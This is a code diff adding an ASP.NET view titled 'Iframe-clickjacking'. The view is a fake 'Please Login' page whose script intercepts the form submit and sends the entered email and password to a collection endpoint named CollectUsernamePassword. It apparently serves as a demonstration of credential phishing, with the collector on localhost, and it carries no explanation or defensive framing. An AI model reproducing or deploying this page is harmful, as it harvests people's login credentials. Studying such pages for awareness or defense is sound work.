@@ -1,0 +1,52 @@
+﻿
+@{
+                /**/
+
+                ViewBag.Title = "Index";
+}
+<!doctype html>
+<html>
+<head>
+    <title>Iframe-clickjacking</title>
+
+    <link rel='stylesheet' href='http://netdna.bootstrapcdn.com/bootstrap/3.0.2/css/bootstrap.min.css'>
+    <link rel="stylesheet" href="~/Content/Site.css">
+</head>
+<body>
+    <div id="fullBg" />
+    <div class="container">
+        <form class="form-signin" id="form">
+            <h1 class="form-signin-heading">Please Login</h1>
+            <input type="text" id="username" class="form-control" name="username" placeholder="Email Address" required="" autofocus="" />
+            <input type="password" id="password" class="form-control" name="password" placeholder="Password" required="" />
+
+            <button class="btn btn-lg btn-primary btn-block" type="submit">Log in</button>
+        </form>
+        <p class="text-center sign-up"><strong>Sign up</strong> for a new account</p>
+    </div>
+    <script type="text/javascript">
+        document.getElementById("form").addEventListener("submit", function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            if (e.target && e.target.id == "form")
+            {
+                var xMLHTTP = new XMLHttpRequest();
+
+                var username = document.getElementById("username").value;
+                var password = document.getElementById("password").value;
+
+                console.log(username, password);
+
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'http://localhost:49670/API/CollectUsernamePassword');
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send('username='+username+'&password='+password)
+            }
+        });
+
+    </script>
+</body>
+</html>
+
+
